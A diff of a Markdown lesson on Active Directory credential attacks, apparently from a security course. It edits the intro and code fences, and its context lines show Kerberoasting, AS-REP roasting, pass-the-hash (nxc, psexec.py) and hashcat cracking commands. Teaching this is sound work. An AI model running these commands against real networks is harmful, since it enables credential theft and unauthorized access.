@@ -4,6 +4,8 @@ id: 76e4a488-6d24-4cce-bcd4-304f02a76eeb
 
 # Credential Attacks
 
+A credential attack is collecting the things that prove who someone is, such as password hashes and login tickets, so you can act as them. In Windows networks you often do not need the real password, because the hash or the ticket works just as well. This lesson goes through the four main ways attackers collect them.
+
 ## The kid version first
 <!-- bite: 9baf1b95-ebf4-4b5d-af4e-c4efedc1fbcd -->
 
@@ -16,7 +18,7 @@ In Windows networks you often don't need to *know* someone's password — you ne
 
 Recall from [[cybersecurity/12-active-directory/02-authentication-and-kerberos|Kerberos]]: a service ticket is encrypted with the *service account's* password hash, and **any authenticated user can request one.**
 
-```
+```text
 GetUserSPNs.py corp.local/alice:Password1 -request -dc-ip 10.0.0.1
    → dumps a $krb5tgs$ hash for every service account with an SPN
 hashcat -m 13100 hashes.txt rockyou.txt
@@ -36,7 +38,7 @@ hashcat -m 13100 hashes.txt rockyou.txt
 
 If an account has **"Kerberos pre-authentication not required"** set (a legacy compatibility option), the KDC will send an AS-REP — encrypted with that account's password hash — to *anyone who asks*, without proving they're that user.
 
-```
+```text
 GetNPUsers.py corp.local/ -usersfile users.txt -no-pass -dc-ip 10.0.0.1
    → for any pre-auth-disabled account, dumps a $krb5asrep$ hash
 hashcat -m 18200 hashes.txt rockyou.txt
@@ -49,7 +51,7 @@ hashcat -m 18200 hashes.txt rockyou.txt
 
 Because **NTLM authenticates with the hash directly** ([[cybersecurity/12-active-directory/02-authentication-and-kerberos|02]]), if you steal an NTLM hash you can authenticate *as that user without ever cracking it*:
 
-```
+```text
 nxc smb 10.0.0.0/24 -u administrator -H <NTLM_hash>
    → authenticates as administrator to every box that accepts that hash
 psexec.py -hashes :<NTLM_hash> administrator@10.0.0.5
@@ -87,7 +89,7 @@ Before any of the above, you need *one* credential. The usual doors:
 ## Cracking, practically
 <!-- bite: cbf8d145-c33d-445c-93a6-9aabe6780741 -->
 
-```
+```text
 hashcat -m 13100 kerb.txt rockyou.txt -r rules/best64.rule   # Kerberoast
 hashcat -m 1000  ntlm.txt rockyou.txt                        # raw NTLM
 ```
